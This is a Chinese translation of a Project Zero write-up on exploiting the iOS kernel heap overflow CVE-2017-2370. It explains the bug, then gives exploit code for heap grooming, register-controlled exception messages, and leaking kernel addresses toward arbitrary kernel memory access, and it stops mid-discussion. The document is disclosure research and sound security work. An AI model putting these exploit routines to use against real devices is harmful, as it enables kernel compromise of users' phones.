
# 【技术分享】深入分析基于异常的 iOS 漏洞利用技术


                                阅读量   
                                **104846**
                            
                        |
                        
                                                                                                                                    ![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：googleprojectzero.blogspot.jp
                                <br>原文地址：[https://googleprojectzero.blogspot.jp/2017/04/exception-oriented-exploitation-on-ios.html](https://googleprojectzero.blogspot.jp/2017/04/exception-oriented-exploitation-on-ios.html)

译文仅供参考，具体内容表达以及含义原文为准

**[![](./img/86003/t016e80dfbc4f161907.jpg)](./img/86003/t016e80dfbc4f161907.jpg)**

****

翻译：[**shan66**](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**前言**

本文将为读者详细介绍编号为[**CVE-2017-2370**](https://bugs.chromium.org/p/project-zero/issues/detail?id=1004)的mach_voucher_extract_attr_recipe_trap mach trap 堆溢出的发现和利用过程。这里不仅介绍了这个漏洞本身的情况，还讲解了漏洞利用技术的开发过程，包括如何反复故意导致系统崩溃，以及如何使用旧的内核漏洞构建活动内核自省功能。

<br>

**这是一陷阱！**

除了大量的[**BSD**](https://developer.apple.com/library/content/documentation/Darwin/Conceptual/KernelProgramming/BSD/BSD.html)系统调用（如ioctl，mmap，execve等）之外，XNU还提供了少量其他的系统调用，通常称为mach陷阱，用来为内核的[**MACH**](https://developer.apple.com/library/content/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html)特性提供支持。Mach 陷阱系统调用的号码是从0x1000000开始的。下面的代码来自定义陷阱表的[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)文件： 



```
/* 12 */ MACH_TRAP(_kernelrpc_mach_vm_deallocate_trap, 3, 5, munge_wll),
/* 13 */ MACH_TRAP(kern_invalid, 0, 0, NULL),
/* 14 */ MACH_TRAP(_kernelrpc_mach_vm_protect_trap, 5, 7, munge_wllww),
```

对于大多数Mach陷阱来说，它们实际上就是内核API的快速通道，并且也是通过标准MACH MIG内核API向外界提供接口的。例如，mach_vm_allocate也是一个可以在任务端口上调用的MIG RPC。

由于避免了调用内核MIG API所涉及的序列化和反序列化所引起的开销，因此Mach陷阱能够为这些内核函数提供速度更快的接口。但是，由于没有提供复杂的代码自动生成功能，所以mach陷阱通常需要以手工方式完成参数解析，但是要想正确完成这项工作的话，那是非常需要技巧的。

在iOS 10中，mach_traps表中出现了一个新条目： 

```
/* 72 */ MACH_TRAP(mach_voucher_extract_attr_recipe_trap, 4, 4, munge_wwww),
```

mach陷阱入口代码会把从用户空间传递给该陷阱的参数打包到如下所示的结构中： 



```
struct mach_voucher_extract_attr_recipe_args {
    PAD_ARG_(mach_port_name_t, voucher_name);
    PAD_ARG_(mach_voucher_attr_key_t, key);
    PAD_ARG_(mach_voucher_attr_raw_recipe_t, recipe);
    PAD_ARG_(user_addr_t, recipe_size);
  };
```

然后将指向该结构的指针作为第一个参数传递给该陷阱的实现代码。值得注意的是，添加一个这样的新系统调用后，我们就可以从系统上的每个沙盒进程中调用它了。直至你到达一个没有沙箱保护的强制性访问控制钩子（并且这里也没有）为止。

我们来看看陷阱代码： 



```
kern_return_t
mach_voucher_extract_attr_recipe_trap(
  struct mach_voucher_extract_attr_recipe_args *args)
{
  ipc_voucher_t voucher = IV_NULL;
  kern_return_t kr = KERN_SUCCESS;
  mach_msg_type_number_t sz = 0;
  if (copyin(args-&gt;recipe_size, (void *)&amp;sz, sizeof(sz)))
    return KERN_MEMORY_ERROR;
```

在Linux上，copyin具有与copy_from_user相似的语义。它会从用户空间指针args-&gt; recipe_size中将4个字节复制到内核堆栈上的sz变量中，确保整个源区段真正位于用户空间中，如果源区段未完全映射或指向内核，则返回错误代码。这样，攻击者就能控制sz变量了。



```
if (sz &gt; MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)
    return MIG_ARRAY_TOO_LARGE;
```

由于mach_msg_type_number_t是32位无符号类型，所以sz必须小于或等于MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE（5120）。



```
voucher = convert_port_name_to_voucher(args-&gt;voucher_name);
  if (voucher == IV_NULL)
    return MACH_SEND_INVALID_DEST;
```

convert_port_name_to_voucher会在调用任务的mach端口命名空间中查找args-&gt; voucher_name mach端口名称，并检查它是否命名了一个ipc_voucher对象，如果是的话，则返回该凭证的引用。因此，我们需要提供一个有效的凭证端口，用于处理voucher_name。



```
if (sz &lt; MACH_VOUCHER_TRAP_STACK_LIMIT) {
    /* keep small recipes on the stack for speed */
    uint8_t krecipe[sz];
    if (copyin(args-&gt;recipe, (void *)krecipe, sz)) {
      kr = KERN_MEMORY_ERROR;
        goto done;
    }
    kr = mach_voucher_extract_attr_recipe(voucher,
             args-&gt;key, (mach_voucher_attr_raw_recipe_t)krecipe, &amp;sz);
    if (kr == KERN_SUCCESS &amp;&amp; sz &gt; 0)
      kr = copyout(krecipe, (void *)args-&gt;recipe, sz);
  }
```

如果sz小于MACH_VOUCHER_TRAP_STACK_LIMIT（256），那么这将在内核堆栈上分配一个小的可变长度数组，并将args-&gt; recipe中的用户指针的sz字节复制到VLA中。然后，该代码将在调用copyout（它需要用到内核和用户空间参数，作用与copyin相反）将结果送回用户空间之前，调用目标mach_voucher_extract_attr_recipe方法。好了，下面让我们来看看如果sz过大，为了保持速度继续让其留在堆栈上会发生什么： 



```
else {
    uint8_t *krecipe = kalloc((vm_size_t)sz);
    if (!krecipe) {
      kr = KERN_RESOURCE_SHORTAGE;
      goto done;
    }
    if (copyin(args-&gt;recipe, (void *)krecipe, args-&gt;recipe_size)) {
      kfree(krecipe, (vm_size_t)sz);
      kr = KERN_MEMORY_ERROR;
      goto done;
    }
```

我们不妨仔细考察一下这个代码段。它调用kalloc在内核堆上分配了一段sz字节的内存，并将相应的地址分赋给krecipe。然后调用copyin，根据args-&gt; recipe用户空间指针复制args-&gt; recipe_size字节到krecipe内核堆缓冲区。

如果您还没有发现错误，请返回到代码段的开头部分，再重新阅读。这绝对是一个漏洞，只是乍一看，好像没有任何毛病！

为了解释这个漏洞，我们不妨探究一下到底发生了什么事情，才导致了这样的代码。当然，这里只是猜想，不过我认为这是相当合理的。

<br>

**copypasta相关代码 **

在mach_kernelrpc.c中，mach_voucher_extract_attr_recipe_trap方法的上面是另一个mach陷阱host_create_mach_voucher_trap的相关代码。

这两个函数看起来很相似。它们都有用于处理小型输入和大型输入的分支，在处理小型输入的分支上面都带有同样的/* keep small recipes on the stack for speed */ 注释，并且都在处理大型输入的分支中分配了内核堆。

很明显，mach_voucher_extract_attr_recipe_trap的代码是从host_create_mach_voucher_trap那里复制粘贴过来的，然后进行了相应的更新。这不同的是，host_create_mach_voucher_trap的size参数是整数，而mach_voucher_extract_attr_recipe_trap的size参数是一个指向整数的指针。

这意味着mach_voucher_extract_attr_recipe_trap需要首先使用copyin处理复制size参数，然后才能使用。更令人困惑的是，原始函数中的size参数被称为recipes_size，而在较新的函数中，它被称为recipe_size（少了一个's'）。

下面是这两个函数的相关代码，其中第一个代码段很好，但是第二个代码中有安全漏洞： 



```
host_create_mach_voucher_trap:
 if (copyin(args-&gt;recipes, (void *)krecipes, args-&gt;recipes_size)) {
   kfree(krecipes, (vm_size_t)args-&gt;recipes_size);
   kr = KERN_MEMORY_ERROR;
   goto done;
 }
mach_voucher_extract_attr_recipe_trap:
  if (copyin(args-&gt;recipe, (void *)krecipe, args-&gt;recipe_size)) {
    kfree(krecipe, (vm_size_t)sz);
    kr = KERN_MEMORY_ERROR;
    goto done;
  }
```

我的猜测是，开发人员复制粘贴了整个函数的代码，然后尝试添加额外的间接级别，但忘记将第三个参数更改为上面显示的copyin调用。他们构建XNU并考察了编译器错误消息。使用[**clang**](https://clang.llvm.org/)构建XNU时，出现了下面的错误消息： 



```
error: no member named 'recipes_size' in 'struct mach_voucher_extract_attr_recipe_args'; did you mean 'recipe_size'?
if (copyin(args-&gt;recipes, (void *)krecipes, args-&gt;recipes_size)) {
                                                  ^~~~~~~~~~~~
                                                  recipe_size
```

Clang认为开发人员多输入了一个“s”。Clang并没有意识到，它的假设在语义上是完全错误的，并且会引发严重的内存破坏问题。我认为开发人员采取了cl ang的建议，删除了's'，然后重新进行了构建，并且没有再出现编错误。

<br>

**构建原语**

如果size参数大于0x4000000，则iOS上的copyin将失败。由于recipes_size也需要一个有效的用户空间指针，这意味着我们必须能够映射一个低的地址。对于64位iOS应用程序来说，我们可以通过给pagezero_size链接器选项赋予一个比较小的值来达到这个目的。通过确保我们的数据与内存页末尾右对齐，后跟一个未映射的内存页来完全控制副本的大小。当副本到达未映射的内存页并停止时，copyin将发生故障。

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b9e22fe253f96629.png)

如果copyin失败，缓冲区将立即释放。

综合起来，我们就可以分配一个大小介于256到5120字节之间的kalloc堆，然后使用完全受控数据任意溢出。

当我利用一个新的漏洞时，我会花费很多时间寻找新的原语；例如分配在堆上的对象，如果我可以溢出它，就可能会导致一连串有趣的事情发生。一般有趣的意思是，如果我得手了，我可以用它来建立一个更好的原语。通常我的最终目标是链接这些原语以获得任意的、可重复和可靠的内存读/写。

为此，我一直在寻找一种对象，它包含一个可以被破坏的长度或大小字段，同时不必完全损坏任何指针。这通常是一个有趣的目标，值得进一步探究。

对于曾经写过浏览器漏洞的人来说，这将是一个熟悉的结构！ 

<br>

**ipc_kmsg**

为了寻找相应的原语，我通读了XNU的代码，并无意中发现了ipc_kmsg： 



```
struct ipc_kmsg {
  mach_msg_size_t            ikm_size;
  struct ipc_kmsg            *ikm_next;
  struct ipc_kmsg            *ikm_prev;
  mach_msg_header_t          *ikm_header;
  ipc_port_t                 ikm_prealloc;
  ipc_port_t                 ikm_voucher;
  mach_msg_priority_t        ikm_qos;
  mach_msg_priority_t        ikm_qos_override
  struct ipc_importance_elem *ikm_importance;
  queue_chain_t              ikm_inheritance;
};
```

这是一个具有可能被破坏的大小字段的结构，并且不需要知道任何指针值。那么，我们该如何使用ikm_size字段？

在代码中寻找对ikm_size的交叉引用，我们可以看到它仅在少数几个地方被用到： 

```
void ipc_kmsg_free(ipc_kmsg_t kmsg);
```

这个函数使用kmsg-&gt; ikm_size将kmsg释放给正确的kalloc内存区。内存区分配器将检测到错误的区域，所以必须小心，在修复大小之前不要释放损坏的ipc_kmsg。

该宏用于设置ikm_size字段： 



```
#define ikm_init(kmsg, size)  
MACRO_BEGIN                   
 (kmsg)-&gt;ikm_size = (size);   
该宏使用ikm_size字段来设置ikm_header指针： 
#define ikm_set_header(kmsg, mtsize)                        
MACRO_BEGIN                                                
 (kmsg)-&gt;ikm_header = (mach_msg_header_t *)                 
 ((vm_offset_t)((kmsg) + 1) + (kmsg)-&gt;ikm_size - (mtsize)); 
MACRO_END
```

该宏使用ikm_size字段来设置ikm_header字段，使消息与缓冲区的末尾对齐。

最后还要检查ipc_kmsg_get_from_kernel： 



```
if (msg_and_trailer_size &gt; kmsg-&gt;ikm_size - max_desc) {
    ip_unlock(dest_port);
    return MACH_SEND_TOO_LARGE;
  }
```

这是使用ikm_size字段来确保消息的ikm_kmsg缓冲区中有足够的空间。

看来，如果我们破坏了ikm_size字段，就能让内核相信消息缓冲区的大小大于其实际尺寸，这几乎肯定会导致消息内容被写出界。不过，这里只是从一个内核堆溢出到…另一个内核堆溢出吗？ 这次的差异在于，一个损坏的ipc_kmsg还可能让我越界读取内存。所以，破坏ikm_size字段可能是一件有趣的事情。

<br>

**关于消息的发送**

ikm_kmsg结构用于保存传输中的信息。当用户空间发送mach消息时，最终会用到ipc_kmsg_alloc。如果消息很小（小于IKM_SAVED_MSG_SIZE），则代码将首先查看cpu本地缓存，以寻找最近释放的ikm_kmsg结构。如果没有找到的话，就从专用的ipc.kmsg zalloc区域分配一个新的可缓存消息。

更大的消息则由kalloc（通用内核堆分配器）直接分配。在分配缓冲区之后，使用我们见过的两个宏立即初始化该结构： 



```
kmsg = (ipc_kmsg_t)kalloc(ikm_plus_overhead(max_expanded_size));
...  
  if (kmsg != IKM_NULL) {
    ikm_init(kmsg, max_expanded_size);
    ikm_set_header(kmsg, msg_and_trailer_size);
  }
  return(kmsg);
```

除非我们能够破坏这两个宏之间的ikm_size字段，否则我们最有可能做到的是使消息被释放到错误的区域并立即引起panic。

但是ikm_set_header还在另一个地方被调用：ipc_kmsg_get_from_kernel。

该函数仅在内核发送真正的mach消息时使用；例如，它不用于发送内核MIG API的响应。这个函数的注释非常有帮助：



```
* Routine: ipc_kmsg_get_from_kernel
 * Purpose:
 *  First checks for a preallocated message
 *  reserved for kernel clients.  If not found -
 *  allocates a new kernel message buffer.
 *  Copies a kernel message to the message buffer.
```

通过用户空间中的mach_port_allocate_full方法，我们可以分配一个新的mach端口，它具有一个大小可控的单个预分配的ikm_kmsg缓冲区。预期的用例是允许用户空间接收关键消息，而内核不必进行堆分配。每当内核发送真正的mach消息时，它首先检查端口是否为这些预先分配的缓冲区之一，并且当前尚未使用。然后，进入下列代码（为了简洁起见，已经删除了无关代码）： 



```
if (IP_VALID(dest_port) &amp;&amp; IP_PREALLOC(dest_port)) {
    mach_msg_size_t max_desc = 0;
    kmsg = dest_port-&gt;ip_premsg;
    if (ikm_prealloc_inuse(kmsg)) {
      ip_unlock(dest_port);
      return MACH_SEND_NO_BUFFER;
    }
    if (msg_and_trailer_size &gt; kmsg-&gt;ikm_size - max_desc) {
      ip_unlock(dest_port);
      return MACH_SEND_TOO_LARGE;
    }
    ikm_prealloc_set_inuse(kmsg, dest_port);
    ikm_set_header(kmsg, msg_and_trailer_size);
    ip_unlock(dest_port);
...  
  (void) memcpy((void *) kmsg-&gt;ikm_header, (const void *) msg, size);
```

这段代码检查消息是否适合（信任kmsg-&gt; ikm_size），将预分配的缓冲区标记为正在使用，调用ikm_set_header宏，设置ikm_header，使消息与缓冲区的结尾对齐，最后调用memcpy将消息复制到ipc_kmsg中。

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016f4ed5c45e38f16b.png)

这意味着如果我们可以破坏预先分配的ipc_kmsg的ikm_size字段，并使其看起来比实际情况大的话，则会将消息内容写入预分配的消息缓冲区的末尾。

ikm_header还用于mach消息接收路径，所以当我们得消息出队时，它也将读出边界。如果我们可以使用要读取的数据替换消息缓冲区之后的内容，我们就可以将其作为消息内容的一部分读取。

我们正在构建的这个新原语在另一个方面更强大：如果我们得手了，我们将能够以可重复的、受控的方式进行越界读写，而不必每次触发漏洞。

<br>

**异常行为**

在使用预分配的消息的时候，存在一个难点：因为只有当内核向我们发送消息时才使用它们，所以我们不能只发送带有受控数据的消息，并使其使用预先分配的ipc_kmsg。相反，我们需要设法让内核向我们发送一个带有我们控制的数据的消息，这是非常困难的！

内核中只有少数几处实际向用户空间发送mach消息。不过，但是存在各种类型的通知消息，如IODataQueue数据可用通知、IOServiceUserNotifications和无发送者通知。这些通知一般只包含少量用户控制的数据。由内核发送的、并且包含大量用户控制数据的唯一消息类型是异常消息。

当线程发生故障（例如访问未分配的内存或调用软件断点指令）时，内核将向线程注册的异常处理程序端口发送异常消息。

如果线程没有异常处理程序端口，内核将尝试将消息发送到任务的异常处理程序端口，如果还失败了，异常消息将被传递到全局主机异常端口。线程可以正常设置自己的异常端口，但设置主机异常端口是特权操作。



```
routine thread_set_exception_ports(
          thread         : thread_act_t;
          exception_mask : exception_mask_t;
          new_port       : mach_port_t;
          behavior       : exception_behavior_t;
          new_flavor     : thread_state_flavor_t);
```

这是thread_set_exception_ports的MIG定义。new_port应该是新的异常端口的发送权限。我们可以使用exception_mask来限制我们要处理的异常类型。behaviour定义了我们想要接收什么类型的异常消息，而new_flavor可以指定要包含在消息中的进程状态。

通过给EXC_MASK_ALL、用于behavior的EXCEPTION_STATE和用于new_flavor的ARM_THREAD_STATE64传递exception_mask，则内核就会发送一个exception_raise_state消息到我们指定的线程发生故障时使用的异常端口。该消息将包含所有ARM64通用寄存器的状态，这就是我们所用的受控数据，它们将被写到ipc_kmsg缓冲区结尾之外！ 

<br>

**相关的汇编代码**

在我们的iOS XCode项目中，我们可以添加一个新的汇编文件，并定义一个函数load_regs_and_crash： 



```
.text
.globl  _load_regs_and_crash
.align  2
_load_regs_and_crash:
mov x30, x0
ldp x0, x1, [x30, 0]
ldp x2, x3, [x30, 0x10]
ldp x4, x5, [x30, 0x20]
ldp x6, x7, [x30, 0x30]
ldp x8, x9, [x30, 0x40]
ldp x10, x11, [x30, 0x50]
ldp x12, x13, [x30, 0x60]
ldp x14, x15, [x30, 0x70]
ldp x16, x17, [x30, 0x80]
ldp x18, x19, [x30, 0x90]
ldp x20, x21, [x30, 0xa0]
ldp x22, x23, [x30, 0xb0]
ldp x24, x25, [x30, 0xc0]
ldp x26, x27, [x30, 0xd0]
ldp x28, x29, [x30, 0xe0]
brk 0
.align  3
```

该函数接收一个指向240字节缓冲区的指针作为第一个参数，然后将该缓冲区的值放到前30个ARM64通用寄存器中，以便当通过brk 0触发软件中断时，内核发送的异常消息能够以相同的顺序存放来自输入缓冲区的字节。

我们现在已经有了一种获取将被发送到预分配端口的消息中的受控数据的方法，但是我们应该用什么值覆盖ikm_size，才能使消息的受控部分与后面堆对象的开始重叠呢？ 通过静态方式可能做到这一点，但是如果使用内核调试器考察发送的情况的话，事情会更简单。然而，iOS只能运行在特定的硬件上，并且它们也没有提供内核调试方面的支持。

<br>

**打造自己的内核调试器（使用printfs和hexdumps）**

通常调试器有两个主要功能：断点和内存读写。实现断点非常麻烦，但是我们仍然可以使用内核内存访问来打造一个内核调试环境。

这里需要处理引导问题；我们需要一个内核漏洞利用，让我们进行内核内存访问，以便开发我们的内核漏洞利用代码来提供内核内存访问功能！在12月份，我发布了mach_portal iOS内核漏洞利用代码，提供了内核内存读/写能力，其中的一些内核内省函数还允许您按名称查找进程任务结构和查找mach端口对象。我们可以转储Mach端口的kobject指针。

这个新漏洞的第一个版本是在mach_portal xcode项目中开发的，所以我可以重用所有的代码。一切就绪后，我会将其从iOS 10.1.1移植到iOS 10.2。

在mach_portal里面，我可以找到一个预先分配的端口缓冲区的地址，如下所示： 



```
// allocate an ipc_kmsg:
 kern_return_t err;
 mach_port_qos_t qos = {0};
 qos.prealloc = 1;
 qos.len = size;
 mach_port_name_t name = MACH_PORT_NULL;
 err = mach_port_allocate_full(mach_task_self(),
                               MACH_PORT_RIGHT_RECEIVE,
                               MACH_PORT_NULL,
                               &amp;qos,
                               &amp;name);
 uint64_t port = get_port(name);
 uint64_t prealloc_buf = rk64(port+0x88);
 printf("0x%016llx,n", prealloc_buf);
get_port是mach_portal漏洞利用代码的一部分，其定义如下： 
uint64_t get_port(mach_port_name_t port_name){
  return proc_port_name_to_port_ptr(our_proc, port_name);
}
uint64_t proc_port_name_to_port_ptr(uint64_t proc, mach_port_name_t port_name) {
  uint64_t ports = get_proc_ipc_table(proc);
  uint32_t port_index = port_name &gt;&gt; 8;
  uint64_t port = rk64(ports + (0x18*port_index)); //ie_object
  return port;
}
uint64_t get_proc_ipc_table(uint64_t proc) {
  uint64_t task_t = rk64(proc + struct_proc_task_offset);
  uint64_t itk_space = rk64(task_t + struct_task_itk_space_offset);
  uint64_t is_table = rk64(itk_space + struct_ipc_space_is_table_offset);
  return is_table;
}
```

这些代码片段都使用了通过内核任务端口读取内核内存的mach_portal利用代码的rk64（）函数。

我通过试错法来确定哪些值覆盖ikm_size后可以使异常消息的受控部分与下一个堆对象的开头对齐。

<br>

**get-where-what**

解决这个谜题的最后一步是要能够找到受控数据在哪里。

在本地提权攻击的上下文中实现该目的的一种方法是将这种数据放置到用户空间中，但像x86上的SMAP和iPhone 7上的AMCC硬件这样的硬件安全措施使得这种方法非常困难。因此，我们将构建一个新的原语，以找出我们的ipc_kmsg缓冲区在内核内存中的位置。

直到现在还没有触及的一个方面是如何将ipc_kmsg分配到我们要溢出的缓冲区边上。Stefan Esser曾经在一些演讲中谈过近几年zalloc堆的演变情况，最新的演讲具有区释放列表随机化的细节。

在使用上述内省技术对堆行为进行实验的过程中，我注意到某些尺寸的类实际上仍然以接近线性的方式进行分配（后面的分配是连续的）。事实证明，这是由于zalloc是从较低级别的分配器获取内存页的；通过耗尽特定区域，我们可以强制zalloc获取新页面，如果我们的分配大小接近页面大小，我们就能立即将该页面返回。

这意味着我们可以使用如下代码： 



```
int prealloc_size = 0x900; // kalloc.4096
  for (int i = 0; i &lt; 2000; i++){
    prealloc_port(prealloc_size);
  }
  // these will be contiguous now, convenient!
  mach_port_t holder = prealloc_port(prealloc_size);
  mach_port_t first_port = prealloc_port(prealloc_size);
  mach_port_t second_port = prealloc_port(prealloc_size);
```

为了获得如下所示的堆布局： 

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0107c650497d561428.png)

该方法并非十分可靠；对于具有更多RAM的设备来说，您需要增加区耗尽循环的迭代次数。这不是一个完美的技术，但对于一个研究工具来说，效果非常好。

我们现在可以释放holder端口，触发溢出，这将重用holder所在的槽并溢出到first_port，然后再使用另一个holder端口抓取这个槽： 



```
// free the holder:
  mach_port_destroy(mach_task_self(), holder);
  // reallocate the holder and overflow out of it
  uint64_t overflow_bytes[] = {0x1104,0,0,0,0,0,0,0};
  do_overflow(0x1000, 64, overflow_bytes);
  // grab the holder again
  holder = prealloc_port(prealloc_size);
```

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0111a233dda741491e.png)

溢出已将属于第一个端口的预先分配的ipc_kmsg的ikm_size字段更改为0x1104。

ipc_kmsg结构由ipc_get_kmsg_from_kernel填写后，将通过ipc_kmsg_enqueue放入目标端口的待处理消息队列： 



```
void ipc_kmsg_enqueue(ipc_kmsg_queue_t queue,
                      ipc_kmsg_t       kmsg)
{
  ipc_kmsg_t first = queue-&gt;ikmq_base;
  ipc_kmsg_t last;
  if (first == IKM_NULL) {
    queue-&gt;ikmq_base = kmsg;
    kmsg-&gt;ikm_next = kmsg;
    kmsg-&gt;ikm_prev = kmsg;
  } else {
    last = first-&gt;ikm_prev;
    kmsg-&gt;ikm_next = first;
    kmsg-&gt;ikm_prev = last;
    first-&gt;ikm_prev = kmsg;
    last-&gt;ikm_next = kmsg;
  }
}
```

如果端口有挂起的消息，则ipc_kmsg的ikm_next和ikm_prev字段将指向挂起的消息的双向链接列表。但如果端口没有挂起的消息，那么ikm_next和ikm_prev都设置为指向本身的kmsg。下面我们使用这个事实来读回第二个ipc_kmsg缓冲区的地址： 



```
uint64_t valid_header[] = {0xc40, 0, 0, 0, 0, 0, 0, 0};
  send_prealloc_msg(first_port, valid_header, 8);
  // send a message to the second port
  // writing a pointer to itself in the prealloc buffer
  send_prealloc_msg(second_port, valid_header, 8);
  // receive on the first port, reading the header of the second:
  uint64_t* buf = receive_prealloc_msg(first_port);
  // this is the address of second port
  kernel_buffer_base = buf[1];
```

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cc3624d43d299e8f.png)

下面是send_prealloc_msg的实现： 



```
void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
  struct thread_args* args = malloc(sizeof(struct thread_args));
  memset(args, 0, sizeof(struct thread_args));
  memcpy(args-&gt;buf, buf, n*8);
  args-&gt;exception_port = port;
  // start a new thread passing it the buffer and the exception port
  pthread_t t;
  pthread_create(&amp;t, NULL, do_thread, (void*)args);
  // associate the pthread_t with the port 
  // so that we can join the correct pthread
  // when we receive the exception message and it exits:
  kern_return_t err = mach_port_set_context(mach_task_self(),
                                            port,
                                            (mach_port_context_t)t);
  // wait until the message has actually been sent:
  while(!port_has_message(port)){;}
}
```

请记住，要将受控数据导入端口预分配的ipc_kmsg中，我们需要内核向其发送异常消息，因此send_prealloc_msg必须导致该异常才行。它需要分配一个 thread_args结构，其中包含在消息和目标端口中所需的受控数据的副本，然后启动将调用do_thread的新线程： 



```
void* do_thread(void* arg) {
  struct thread_args* args = (struct thread_args*)arg;
  uint64_t buf[32];
  memcpy(buf, args-&gt;buf, sizeof(buf));
  kern_return_t err;
  err = thread_set_exception_ports(mach_thread_self(),
                                   EXC_MASK_ALL,
                                   args-&gt;exception_port,
                                   EXCEPTION_STATE,
                                   ARM_THREAD_STATE64);
  free(args);
  load_regs_and_crash(buf);
  return NULL;
}
```

do_thread将受控数据从thread_args结构复制到本地缓冲区，然后将目标端口设置为该线程的异常处理程序。它会释放参数结构，然后调用load_regs_and_crash，它是一个简单的汇编器，用来将缓冲区的值复制到前30个ARM64通用寄存器中，并触发软件断点。

此时内核的中断处理程序将调用exception_deliver，它将查找线程的异常端口并调用MIG mach_exception_raise_state方法，该方法会将崩溃的线程的寄存器状态序列化为MIG消息，并调用mach_msg_rpc_from_kernel_body，该脚本将抓取异常端口的预先分配的ipc_kmsg，并信任 ikm_size字段，然后使用它将发送的消息与它认为的缓冲区结尾对齐： 

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019c2ac65c7a2048f4.png)

为了实际读取数据，我们需要接收异常消息。就这里来说，我们得到了内核向第一个端口发送的消息，这个端口会影响向第二个端口上写入的有效报头。为什么通过内存损坏原语利用它已有的相同数据来覆盖下一条消息的报头呢？

请注意，如果我们发送消息并立即接收的话，就能读回来我们所写的内容。为了读回有用的东西，我们必须进行相应的修改。我们可以在将消息发送到第一个端口之后且接收消息之前向第二个端口发送消息。

根据我之前的观察，如果一个端口的消息队列为空，当消息排队时，ikm_next字段将指向该消息本身。因此，通过向second_port发送消息（用一个使ipc_kmsg仍然有效且未被使用的内容覆盖它的报头），然后读回发送到第一个端口的消息，我们就能过确定第二个端口的ipc_kmsg缓冲区的地址。

<br>

**从读/写到任意读/写 **

现在，我们已经使得堆溢出获取了可靠覆盖并读取first_port ipc_kmsg对象之后的240字节区域的内容的能力了，这正是我们想要的。我们也知道该内存区位于内核的虚拟地址空间中。最后一步是将其转化为具备读写任意内核内存的能力。

虽然mach_portal漏洞利用代码可用于内核任务端口对象。但是，这一次我选择了一条不同的路径，主要是受到了Lookout writeup中详细描述的Pegasus漏洞利用代码中一个简洁技巧的启发。

开发过这个漏洞利用代码的人都发现IOKit Serializer :: serialize方法是一个非常便捷的小工具，可以将通过一个指向受控数据的参数调用一个函数的能力，转换为可以使用两个完全受控的参数调用另一个受控函数的能力。

为此，我们需要调用受控地址，将指针传递给受控数据。我们还需要知道OSSerializer :: serialize的地址。

下面，我们释放second_port并重新分配一个IOKit用户客户端： 



```
// send another message on first
  // writing a valid, safe header back over second
  send_prealloc_msg(first_port, valid_header, 8);
  // free second and get it reallocated as a userclient:
  mach_port_deallocate(mach_task_self(), second_port);
  mach_port_destroy(mach_task_self(), second_port);
  mach_port_t uc = alloc_userclient();
  // read back the start of the userclient buffer:
  buf = receive_prealloc_msg(first_port);
  // save a copy of the original object:
  memcpy(legit_object, buf, sizeof(legit_object));
  // this is the vtable for AGXCommandQueue
  uint64_t vtable = buf[0];
```

alloc_userclient分配AGXAccelerator IOService的用户客户端类型为5，它是一个AGXCommandQueue对象。IOKit的默认运算符operator new使用kalloc，AGXCommandQueue是0xdb8字节，因此它也将使用kalloc.4096内存区，并重用由second_port ipc_kmsg释放的内存。

请注意，我们发送了另一个消息，其中有一个对first_port有效的报头，它用一个有效的报头来覆盖second_port的报头。这就是说，在second_port被释放并且为用户客户端重新使用内存之后，我们可以从first_port读出消息，并读回到AGXCommandQueue对象的前240个字节中。第一个qword是指向AGXCommandQueue的vtable的指针，使用它可以确定KASLR slide，从而计算出OSSerializer :: serialize的地址。

在AGXCommandQueue用户客户端上调用任何IOKit MIG方法可能会导致至少三个虚拟调用： 用户客户端口的MIG intran将通过iokit_lookup_connect_port调用:: retain（）。这个方法也调用:: getMetaClass（）。最后，MIG包装器将调用iokit_remove_connect_reference，而它将调用:: release（）。

由于这些都是C ++虚拟方法，它们将作为第一个（隐含）参数传递这个指针，这意味着我们可以满足使用OSSerializer::serialize小工具所需条件了。让我们深入考察其工作原理： 



```
class OSSerializer : public OSObject
{
  OSDeclareDefaultStructors(OSSerializer)
  void * target;
  void * ref;
  OSSerializerCallback callback;
  virtual bool serialize(OSSerialize * serializer) const;
};
bool OSSerializer::serialize( OSSerialize * s ) const
{
  return( (*callback)(target, ref, s) );
}
```

如果看一下OSSerializer::serialize的反汇编代码，就清楚了发生了什么事： 



```
; OSSerializer::serialize(OSSerializer *__hidden this, OSSerialize *)
MOV  X8, X1
LDP  X1, X3, [X0,#0x18] ; load X1 from [X0+0x18] and X3 from [X0+0x20]
LDR  X9, [X0,#0x10]     ; load X9 from [X0+0x10]
MOV  X0, X9
MOV  X2, X8
BR   X3                 ; call [X0+0x20] with X0=[X0+0x10] and X1=[X0+0x18]
```

由于我们对AGXCommandQueue用户客户端的前240个字节具有读/写权限，并且我们知道它在内存中的位置，所以我们可以使用以下伪造对象来替换它，该虚拟对象会将一个虚拟调用转换为一个任意函数指针的调用，并且带两个受控参数：

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d80ca053478a5b1b.png)

我们已将vtable指针重定向到该对象，以便对所需vtable条目与数据进行相应的处理。我们现在还需要一个原语，将具有两个受控参数的任意函数调用转换为任意内存读/写。

像copyin和copyout这样的函数都是不错的候选者，因为它们都能处理跨用户/内核边界的内存拷贝，但它们都有三个参数：源、目的地和大小，我们只能完全控制两个。

